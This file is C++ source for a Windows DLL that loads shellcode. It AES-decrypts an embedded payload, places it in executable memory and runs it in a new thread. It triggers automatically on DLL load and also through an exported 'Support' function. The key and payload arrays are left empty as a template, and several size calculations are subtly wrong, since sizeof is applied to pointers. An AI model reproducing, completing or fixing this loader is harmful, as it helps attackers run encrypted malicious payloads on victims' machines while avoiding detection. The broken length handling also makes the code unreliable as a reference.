#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <wininet.h>
#include <stdlib.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#pragma comment(lib, "wininet.lib")

void DeAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    try {
        CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
        CryptHashData(hHash, (BYTE*)key, keyLen, 0);
        CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
        CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);

    }
    catch (...) {
        return;
    }
}



BOOL AllocService(char* AESkey, char* payload) {
    DWORD payload_length = sizeof(payload);

    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!alloc_mem) {
        printf("Failed to Allocate memory (%u)\n", GetLastError());
        return -1;
    }
    DeAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
    MoveMemory(alloc_mem, payload, sizeof(payload));
    //RtlMoveMemory(alloc_mem, payload, sizeof(payload));


    DWORD oldProtect;

    if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -2;
    }


    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    printf("\n\nalloc_mem : %p\n", alloc_mem);
    WaitForSingleObject(tHandle, INFINITE);
    ((void(*)())alloc_mem)();

    return 0;

    return TRUE;
}


BOOL MainClass()
{
   // MessageBox(NULL, L"Welcome!", L"iskw", MB_OK);

    unsigned char AESkey[] = { };
    unsigned char payload[] = { };


    return AllocService((char*)AESkey, (char*)payload);

    


}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MainClass();
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL WINAPI Support(void) {

        return MainClass();
    }
}

